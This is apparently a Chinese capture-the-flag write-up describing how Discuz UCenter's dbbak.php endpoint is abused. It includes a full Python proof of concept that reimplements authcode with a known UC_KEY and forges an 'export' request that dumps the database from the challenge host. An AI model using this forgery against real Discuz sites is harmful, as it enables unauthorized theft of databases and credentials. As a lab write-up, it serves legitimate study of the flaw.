![img](../assets/1755430984426-16.png)

首先接受两个传参，code和apptype

![img](../assets/1755430984426-17.png)

接着会根据apptype导入不同的配置文件，配置文件里面会有数据库连接信息，密钥等信息

![img](../assets/1755430984426-18.png)

而code会通过_authcode函数进行解密，解出数组get。然后判断数据get是否为空且里面的time是否在一小时之内

![img](../assets/1755430984426-19.png)

根据不同的apptype连接不同的数据库，并根据get数组里面的method进行对应的操作，我们这里只需要export导出数据库就行了

![img](../assets/1755430984426-20.png)

流程走完，写个脚本生成一下code

POC

```Python
import base64
import hashlib
import time
import urllib.parse

UC_KEY = "N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb"
TARGET = "http://challenge.xinshi.fun:31430/uc_server/api/dbbak.php?apptype=discuzx&"

def authcode(string, operation='DECODE', key=UC_KEY, expiry=0):
    ckey_length = 4
    key = hashlib.md5(key.encode()).hexdigest()
    keya = hashlib.md5(key[:16].encode()).hexdigest()
    keyb = hashlib.md5(key[16:].encode()).hexdigest()
    if ckey_length:
        if operation == 'DECODE':
            keyc = string[:ckey_length]
        else:
            keyc = hashlib.md5(str(time.time()).encode()).hexdigest()[-ckey_length:]
    else:
        keyc = ''
    cryptkey = keya + hashlib.md5((keya + keyc).encode()).hexdigest()
    key_length = len(cryptkey)

    if operation == 'DECODE':
        string = base64.b64decode(string[ckey_length:].encode())
    else:
        expiry_time = expiry + int(time.time()) if expiry else 0
        string = ('%010d' % expiry_time).encode() + \
                 hashlib.md5((string + keyb).encode()).hexdigest()[:16].encode() + \
                 string.encode()

    box = list(range(256))
    rndkey = [ord(cryptkey[i % key_length]) for i in range(256)]
    j = 0
    for i in range(256):
        j = (j + box[i] + rndkey[i]) % 256
        box[i], box[j] = box[j], box[i]

    result = bytearray()
    a = j = 0
    for byte in string:
        a = (a + 1) % 256
        j = (j + box[a]) % 256
        box[a], box[j] = box[j], box[a]
        result.append(byte ^ box[(box[a] + box[j]) % 256])

    if operation == 'DECODE':
        result = result.decode(errors='ignore')
        if (len(result) > 26 and
            (int(result[:10]) == 0 or int(result[:10]) - int(time.time()) > 0) and
            result[10:26] == hashlib.md5((result[26:] + keyb).encode()).hexdigest()[:16]):
            return result[26:]
        else:
            return ''
    else:
        return keyc + base64.b64encode(result).decode().replace('=', '')


def build_code(params: dict, expiry=3600) -> str:
    # 构造 query string
    query = urllib.parse.urlencode(params, doseq=True)
    return authcode(query, 'ENCODE', UC_KEY, expiry)


if __name__ == "__main__":
    # 构造 payload
    payload = {
        "method": "export",
        "time": int(time.time())
    }

    # 生成 code，有效期 1 小时
    code = build_code(payload, expiry=3600)
    print("[*] code =", code)

    # 拼接最终 URL
    url = f"{TARGET}code={urllib.parse.quote(code)}"
    print("[*] Final URL:\n", url)
```

下载导出的数据库

![img](../assets/1755430984426-21.png)

![img](../assets/1755430984426-22.png)

找到hex的flag

![image-20250818185157399](../assets/image-20250818185157399.png)